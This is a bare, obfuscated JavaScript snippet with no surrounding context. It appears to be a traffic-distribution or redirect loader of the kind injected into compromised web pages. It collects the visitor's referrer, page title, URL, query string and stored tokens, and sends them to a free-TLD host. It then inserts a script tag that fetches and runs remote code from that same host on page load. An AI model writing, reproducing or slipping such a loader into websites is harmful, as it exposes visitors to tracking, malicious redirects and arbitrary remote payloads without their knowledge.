 (function() {
    var name = '_NDDm2B2ct7W1WXKf';
    if (!window._NDDm2B2ct7W1WXKf) {
        window._NDDm2B2ct7W1WXKf = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/kSrxJ6',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _L9C6dDK2TFk6Sjkw = localStorage.getItem('config');
    if (typeof _L9C6dDK2TFk6Sjkw !== 'undefined' && _L9C6dDK2TFk6Sjkw !== null) {
        var _tBYhrVPxM8jnTyJW = JSON.parse(_L9C6dDK2TFk6Sjkw);
        var _YKX323X6MHMkR7JW = Math.round(+new Date()/1000);
        if (_tBYhrVPxM8jnTyJW.created_at + window._NDDm2B2ct7W1WXKf.ttl < _YKX323X6MHMkR7JW) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _bftWcnNtT8FdYjSR = localStorage.getItem('subId');
    var _fkyzYmYLLWjHCyL9 = localStorage.getItem('token');
    var _QLyY5tZXjVZrszzj = '?return=js.client';
        _QLyY5tZXjVZrszzj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _QLyY5tZXjVZrszzj += '&se_referrer=' + encodeURIComponent(document.referrer);
        _QLyY5tZXjVZrszzj += '&default_keyword=' + encodeURIComponent(document.title);
        _QLyY5tZXjVZrszzj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _QLyY5tZXjVZrszzj += '&name=' + encodeURIComponent(name);
        _QLyY5tZXjVZrszzj += '&host=' + encodeURIComponent(window._NDDm2B2ct7W1WXKf.R_PATH);
    if (typeof _bftWcnNtT8FdYjSR !== 'undefined' && _bftWcnNtT8FdYjSR && window._NDDm2B2ct7W1WXKf.unique) {
        _QLyY5tZXjVZrszzj += '&sub_id=' + encodeURIComponent(_bftWcnNtT8FdYjSR);
    }
    if (typeof _fkyzYmYLLWjHCyL9 !== 'undefined' && _fkyzYmYLLWjHCyL9 && window._NDDm2B2ct7W1WXKf.unique) {
        _QLyY5tZXjVZrszzj += '&token=' + encodeURIComponent(_fkyzYmYLLWjHCyL9);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._NDDm2B2ct7W1WXKf.R_PATH + _QLyY5tZXjVZrszzj;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
